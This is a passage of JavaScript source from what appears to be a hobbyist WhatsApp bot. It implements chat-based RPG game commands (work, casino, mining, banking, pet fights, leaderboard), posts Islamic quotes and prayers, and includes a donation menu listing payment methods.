      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    replydare(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replydare(`${caption}`)
}
break
//=========================================\\
case 'nebang':
case 'down': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

    return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
	  let user = global.db.users[m.sender]
    let time = user.lastparming + 1800000
    if (new Date - user.lastparming < 1800000) return replydare(`You are tired of working\nWait for ${msToTime(time - new Date())} Again`)
	let wood = `${Math.floor(Math.random() * 50)}`.trim()
	let money = `${Math.floor(Math.random() * 50000)}`.trim()
	user.wood += wood * 1
	user.money += money * 1
	user.lastparming = new Date * 1
    replydare(`Congratulations you got it : \n+${wood} Wood\n+${money} Money`)
}
break
//=========================================\\
case 'casino': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
    Dare.casino = Dare.casino ? Dare.casino : {}
    if (m.chat in Dare.casino) return reply ('There are still people doing casino here, wait until its finished!!')
    else Dare.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomYou * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply('casino <amount>\n ' + 'casino 1000', )
        if (global.db.users[m.sender].exp >= count * 1) {
            global.db.users[m.sender].exp -= count * 1
            //await reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nYou lost ${count} Money(xp)`)
            } else if (Aku < Kamu) {
                global.db.users[m.sender].exp += count * 2
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nYou get ${count * 2} Money(xp)`)
            } else {
                global.db.users[m.sender].exp += count * 1
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*series*\nYou get ${count * 1} Money(xp)`)
            }
        } else reply(`Your money (xp) is not enough for the Casino, please *#work* first!`)
    } catch (e) {
        console.log(e)
        reply('Error!!')
        if (DevMode) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != Dare.user.jid)) {
                Dare.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    } finally {
        delete Dare.casino[m.chat]
    }
}
break
//=========================================\\
case 'donate':
case 'pay':
case 'payment': {
  await Dare.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://files.catbox.moe/7rt6v2.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Dare.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Below is a list of my payment methods~`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/dana.jpg' } }, { upload: Dare.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Click the OPAY button below to copy aza\n> BANK: OPAY: ${global.andana}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment OPAY\",\"id\":\"123456789\",\"copy_code\"${global.nodana}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/gopay.jpg' } }, { upload: Dare.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Click the OPAY button below\n> BANK: OPAY: ${global.angopay}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment OPAY\",\"id\":\"123456789\",\"copy_code\"${global.nogopay}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/qris.jpg' } }, { upload: Dare.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> click button\n> send screenshot` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{\"display_text\":\"Send screenshot here\",\"url\":\"https://wa.me/2348089405509\",\"merchant_url\":\"https://www.google.com\"}`
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fkontak }
  );

  await Dare.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;

//=========================================\\
case 'kerja':
case 'work': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'father', 'the same girl', 'little epep', 'mothers mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['carrot', 'mustard greens', 'lettuce', 'tomato', 'celery', 'chili', 'meat', 'fish', 'chicken']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['headache', 'injury', 'burn', 'fracture']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Carrots', 'Cabbage', 'stowbery', 'tea', 'rice', 'orange', 'banana', 'watermelon', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['car', 'motorcycle', 'rickshaw', 'rickshaw', 'bus', 'angkot', 'rickshaw', 'bike']
    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Building a House', 'Constructing a Building', 'Repairing a House', 'Repairing a Building', 'Building Public Facilities', 'Repairing Public Facilities']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked\nIt's time to take a break ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
replydare(`You Have Delivered *${penumpang}* 🚗\nAnd get the money worth it *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
replydare(`There are buyers who buy *${dagangan}* 🛒\nAnd get the money worth it *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
replydare(`You cure the patient *${pasien}* 💉\nAnd get the money worth it *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
replydare(`${panen} It's been harvested!🌽 And sell it   \nAnd get the money worth Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
replydare(`You Just get a customer and improve *${bengkel} 🔧*\nAnd you get your money's worth *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return replydare(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
replydare(`You just finished ${rumah} 🔨\nAnd get the money worth it *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
            default:
return replydare(`_*Choose the job you want*_\n\n_• Coolie_ \n_• Mechanic_ \n_• Farmer_ \n_• Doctor_ \n_• Trader_ \n_• Taxibike_ \n\nUsage Example :\ncoolie work`)
        }
    }
}
break
//=========================================\\
  case 'bankcek':
case 'bank': {
    if (!m.isGroup) return reply(mess.only.group)
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? Dare.user.jid: m.sender
    if (!(who in global.db.users)) return reply(`User ${who} not in database`)
    let user = global.db.users[who]
    let isMods = global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let DareTheCreator = m.fromMe || isMods || [Dare.decodeJid(Dare.user.id), ...global.owner.filter(([number, _, DareTheCreator]) => number && !DareTheCreator).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isPrems =  DareTheCreator || new Date() - user.premiumTime < 0
    let caption = `
▧「 *BANK* 」
│ 🙂 Name: ${user.registered ? user.name: Dare.getName(m.sender)}
│ ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
│ ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
│ ${global.rpg.emoticon('money')} Money: ${user.money}
│ ${global.rpg.emoticon('chip')} Chip: ${user.chip}
│ 🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
│ 🌟 Status: ${isMods ? 'Developer' : DareTheCreator ? 'Owner' : isPrem ? 'Premium User 🙂' : user.level > 999 ? 'Elite User' : 'Free User'}
│ 📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
    replydare(`${caption}`)
}
break
//=========================================\\
case 'bansos':
case 'assist': {
  if (!m.isGroup) return reply(mess.only.group)
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function clockString(ms) {
    let h = Math.floor(ms / 3600000);
    let m = Math.floor(ms / 60000) % 60;
    let s = Math.floor(ms / 1000) % 60;
    return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
  }

  let user = global.db.users[m.sender];
  let randomaku = Math.floor(Math.random() * 101);
  let randomkamu = Math.floor(Math.random() * 101);
  let __timers = new Date() - user.lastbansos;
  let _timers = 360 - __timers;
  let timers = clockString(_timers);

  if (user.money < 1000) {
    return replydare(`Your Money Must Be Above One Thousand To Use This Command`);
  }

  if (new Date() - user.lastbansos > 300000) {
    if (randomaku > randomkamu) {
      user.money -= 3000000;
      user.lastbansos = new Date() * 1;
      return Dare.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
        caption: `You were caught after you corrupted social assistance funds🕴️💰, and you have to pay a fine of 3 million rupiah💵`
      });
    } else if (randomaku < randomkamu) {
      user.money += 3000000;
      user.lastbansos = new Date() * 1;
      return Dare.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
        caption: `You succeeded in corrupting social assistance funds🕴️💰, and you got 3 million rupiah💵`
      });
    } else {
      user.lastbansos = new Date() * 1;
      return replydare(`Sorry, sɪʀ. You didn't succeed in social assistance corruption and didn't go to jail because you *ran away🏃*`);
    }
  } else {
    return replydare(`Please wait a few minutes for more social assistance`);
  }
}
break;

//=========================================\\
case 'taxy':
case 'taxi': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Taxy'
    Dare.misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        replydare(`Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - user.lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 1000000)
        let randomaku2 = Math.floor(Math.random() * 10000)
        
        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🚕


✔️ Get orders....
`.trim()

        var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳  🌳 🏘️  🏘️🏡


🚖 Deliver to destination.....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳  🌳 🏘️


🚖 Finished Delivering Customers....
`.trim()

        var dimas4 = `
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 🙂 Money = [ ${randomaku1} ]
➕ 🙂 Exp = [ ${randomaku2} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()

        user.money += randomaku1
        user.exp += randomaku2
        user.ojekk += 1
        
        Dare.misi[id] = [
            kerja,
        setTimeout(() => {
            delete Dare.misi[id]
        }, 27000)
        ]
        
        setTimeout(() => {
            replydare(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replydare(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replydare(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replydare(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replydare(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replydare('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replydare(`Please wait for ${timers}, to complete the mission again`)
}
break
//=========================================\\
//=========================================\\
case 'leaderboard': {
  if (!m.isGroup) return reply(mess.only.group)
const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
  if (!number) return number
  number = parseInt(number)
  return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
    'level',
    'exp',
    'limit',
    'money',
    'iron',
    'gold',
    'diamond',
    'emerald',
    'trash',
    'joinlimit',
    'potion',
    'petFood',
    'wood',
    'rock',
    'string',
    'common',
    'uncommon',
    'mythic',
    'legendary',
    'pet',
    'bank',
    'chip',
    'skata'
]
    let users = Object.entries(global.db.users).map(([key, value]) => {
        return {
            ...value, jid: key
        }
    })
    let imgr = getRandom()
    let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
    let type = (args[0] || '').toLowerCase()
    const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
    let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
    if (!leaderboard.includes(type))
        return await reply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
        contextInfo: {
            
        }
    })
    let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
    let sortedItem = users.map(toNumber(type)).sort(sort(type))
    let userItem = sortedItem.map(enumGetKey)
    // let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
    let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

                *• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: Dare.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
    return await reply(text,{
        contextInfo: {
            mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
           
        }
    })
}
break
//=========================================\\
case 'mulung':
case 'gloomy': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds
    return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
    let user = global.db.users[m.sender]
    let time = user.lastmulung + 1800000

    if (new Date - user.lastmulung < 1800000) return replydare(`Anda sudah lelah untuk mulung\nWait for ${msToTime(time - new Date())} Again`)

    let botol = Math.floor(Math.random() * 1000)
    let kaleng = Math.floor(Math.random() * 1000)
    let kardus = Math.floor(Math.random() * 1000)
    let gelas = Math.floor(Math.random() * 1000)
    let plastik = Math.floor(Math.random() * 1000)

    user.botol += botol * 1
    user.kaleng += kaleng * 1
    user.kardus += kardus * 1
    user.gelas += gelas * 1
    user.plastik += plastik * 1
    user.lastmulung = new Date * 1

    replydare(`Congratulations you got it : \n+${botol} Bottle\n+${kaleng} Can\n+${kardus} Cardboard box\n+${gelas} Glass\n+${plastik} Plastic`)
}
break
//=========================================\\
case 'mining': {
function reward(user = {}) {
    let rewards = {
        reward: {
            exp: 1000,
            trash: 101,
            string: 25,
            rock: 30,
            iron: 25,
            diamond: 10,
            emerald: 4,
            common: 2 * (user.dog && (user.dog > 2 ? 2 : user.dog) * 1.2 || 1),
            uncommon: [0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.dog > 2 && user.dog < 6 && user.dog) || (user.dog > 5 && 5) || 2
                )).fill(0)
            ),
            mythic: [0, 0, 0, 0, 0, 1, 0, 0, 0].concat(
                new Array(8 - (
                    (user.dog > 5 && user.dog < 8 && user.dog) || (user.dog > 7 && 8) || 3
                )).fill(0)
            ),
            legendary: [0, 0, 0, 0, 0, 0, 0, 1, 0, 0].concat(
                new Array(10 - (
                    (user.dog > 8 && user.dog) || 4
                )).fill(0)
            ),
            iron: [0, 0, 0, 1, 0, 0],
            gold: [0, 0, 0, 0, 0, 1, 0],
            diamond: [0, 0, 0, 0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.fox < 6 && user.fox) || (user.fox > 5 && 5) || 0
                )).fill(0)
            ),
        },
        lost: {
            health: 40 - user.cat * 4,
            pickaxedurability: 10
        }
    }
    return rewards
}
const cooldown = 300000;
    let user = global.db.users[m.sender];
    let timers = cooldown - (new Date() - user.lastmining);
    if (user.health < 80) {
        return reply(`
⚠️ Need at least 80 ❤️Healths to mine!! ⚠️
Please buy ❤️Healths first by typing *${usedPrefix}buy potion <amount>*,
and type *${usedPrefix}heal <amount>* to use the potion.
`.trim());
    }

    if (user.pickaxe == 0) {
        return reply('⛏️ You cant mine without a mining tool (pickaxe)! ⛏️');
    }

    if (new Date() - user.lastmining <= cooldown) {
        return reply(`
⏳ You've mined before! Please wait *${(timers / 1000).toFixed(2)} seconds* before mining again.
`.trim());
    }

    const rewards = reward(user);
    let text = 'You have mined and lost';
    for (const lost in rewards.lost) {
        if (user[lost]) {
            const total = rewards.lost[lost].getRandom();
            user[lost] -= total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(lost)}${lost}:* ${total}`;
            }
        }
    }

    text += '\n\nBut you get it';
    for (const rewardItem in rewards.reward) {
        if (rewardItem in user) {
            const total = rewards.reward[rewardItem].getRandom();
            user[rewardItem] += total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(rewardItem)}${rewardItem}:* ${total}`;
            }
        }
    }

    reply(text.trim());
    user.lastmining = new Date() * 1;
}
break
case 'nabung':
case 'save': {
const xpperlimit = 1
	let user = global.db.users[m.sender]
  let count = command.replace(/^save/i, '')
  count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return reply('You dont have an ATM yet !')
  if (user.bank > user.fullatm) return reply('Your bank is full!')
  if (count > user.fullatm - user.bank) return reply('The money doesnt fit in the bank')
  if (global.db.users[m.sender].money >= xpperlimit * count) {
    global.db.users[m.sender].money -= xpperlimit * count
    global.db.users[m.sender].bank += count
    reply(`Success in saving amount ${count} Money 🙂`)
  } else reply(`[❗] You don't have enough money to save ${count} money 🙂`)
}
 break
case 'fightnaga':
  case 'dragon': {
    if (!m.isGroup) return reply(mess.only.group)
function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(a => a.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)
  reply(`*Your Pet* (🐉dragon ${nogorojo} ) ⚔️challenge 🐉the dragon *${penumpang}* (🐉your dragon) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  let i
  for (i=0;i<global.db.users[m.sender].naga;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].naga;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐉You* (dragon ${global.db.users[m.sender].naga}) WIN against the 🐉dragon *${Dare.getName(lawan)}* (naga ${global.db.users[lawan].naga}) because of your dragon🐉 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nPresent Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐉You* (dragon ${global.db.users[m.sender].naga}) LOST against the 🐉dragon *${Dare.getName(lawan)}* (naga ${global.db.users[lawan].naga}) because of your pet ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced by Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
break
case 'fightkyubi':
case 'kyubi': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🦊kyubi ${penumpang}) ⚔️challenging his 🦊kyubi *${nogorojo}* (🦊your kyubi) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  let i
  let unggul
  for (i=0;i<global.db.users[m.sender].kyubi;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kyubi;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
